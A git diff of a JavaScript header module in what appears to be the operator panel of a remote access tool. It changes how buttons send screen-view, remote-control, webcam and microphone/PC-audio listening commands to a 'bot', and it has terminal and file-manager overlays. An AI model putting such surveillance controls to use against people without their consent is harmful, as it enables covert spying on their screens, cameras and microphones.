@@ -1,18 +1,19 @@
 // frontend/client_control/js/modules/ui/header.js
 import { AppState } from '../core/states.js';
 
-// Инициализация кнопок быстрого доступа и переключателей ресурсов в шапке
 export const initHeaderControls = () => {
   const $ = id => document.getElementById(id);
+  
+  // Конфигурация строго по ТЗ V7.2
+  // Модули: ScreenView, RemoteControl, Webcam. Мета: None
   const actions = [
-    { id: 'btn-desktop-stream', ref: AppState.desktop, key: 'observe', mod: 'ScreenView', cmds: ['start_stream', 'stop_stream'] },
-    { id: 'btn-desktop-control', ref: AppState.desktop, key: 'control', mod: 'RemoteControl', cmds: ['start_control', 'stop_control'] },
-    { id: 'btn-webcam-stream', ref: AppState.webcam, key: 'active', mod: 'CamGaze', cmds: ['start', 'stop'] },
-    { id: 'btn-audio-pc', ref: AppState.audio, key: 'output', mod: 'AudioPulse', cmds: ['listen_pc_on', 'listen_pc_off'] },
-    { id: 'btn-audio-mic', ref: AppState.audio, key: 'input', mod: 'AudioPulse', cmds: ['listen_mic_on', 'listen_mic_off'] }
+    { id: 'btn-desktop-stream', ref: AppState.desktop, key: 'observe', mod: 'ScreenView:None' },
+    { id: 'btn-desktop-control', ref: AppState.desktop, key: 'control', mod: 'RemoteControl:None' },
+    { id: 'btn-webcam-stream', ref: AppState.webcam, key: 'active', mod: 'Webcam:None' },
+    { id: 'btn-audio-pc', ref: AppState.audio, key: 'output', mod: 'AudioPulse:PC' },
+    { id: 'btn-audio-mic', ref: AppState.audio, key: 'input', mod: 'AudioPulse:Mic' }
   ];
 
-  // Универсальный триггер для изменения состояния кнопок и отправки команд
   const toggleAction = (a, force = null, silent = false) => {
     const btn = $(a.id), state = force ?? !a.ref[a.key];
     if (a.ref[a.key] === state && force === null) return;
@@ -25,10 +26,14 @@ export const initHeaderControls = () => {
       cvs && Object.assign(cvs.style, { pointerEvents: state ? 'auto' : 'none' });
       state && cvs?.focus();
     }
-    !silent && window.sendToBot?.(a.mod, state ? a.cmds[0] : a.cmds[1]);
+
+    // ТЗ V7.2: payload 1 или 0 (window.sendToBot упакует это в 4 байта BigEndian)
+    if (!silent && window.sendToBot) {
+        window.sendToBot(a.mod, state ? 1 : 0);
+    }
   };
 
-  // Настройка открытия оверлеев (терминал, файлы)
+  // ... остальной код (setupToggle и т.д.) без изменений
   const setupToggle = (id, ovlId, onOpen) => {
     const btn = $(id), ovl = $(ovlId);
     if (!btn || !ovl) return;
@@ -46,22 +51,23 @@ export const initHeaderControls = () => {
   
   setupToggle('btn-files-toggle', 'files-overlay', () => window.openFileManager?.());
 
-  // Привязка событий к основным кнопкам действий
   actions.forEach(a => {
     const el = $(a.id);
     el && (el.onclick = () => toggleAction(a));
   });
 
-  // Синхронизация ресурсов при смене режима (например, выключение стрима при переходе)
   window.syncModeResources = mode => {
-    [$('terminal-overlay'), $('files-overlay')].forEach(el => el?.classList.add('hidden'));
-    [$('btn-terminal-toggle'), $('btn-files-toggle')].forEach(el => el?.classList.remove('active'));
+    const termOvl = $('terminal-overlay'), filesOvl = $('files-overlay');
+    const termBtn = $('btn-terminal-toggle'), filesBtn = $('btn-files-toggle');
+    
+    [termOvl, filesOvl].forEach(el => el?.classList.add('hidden'));
+    [termBtn, filesBtn].forEach(el => el?.classList.remove('active'));
     
     if (mode === 'webcam') {
-      toggleAction(actions[0], false);
-      toggleAction(actions[1], false);
+      toggleAction(actions[0], false); // Stop ScreenView
+      toggleAction(actions[1], false); // Stop RemoteControl
     } else if (mode === 'desktop') {
-      toggleAction(actions[2], false);
+      toggleAction(actions[2], false); // Stop Webcam
     }
   };
 };
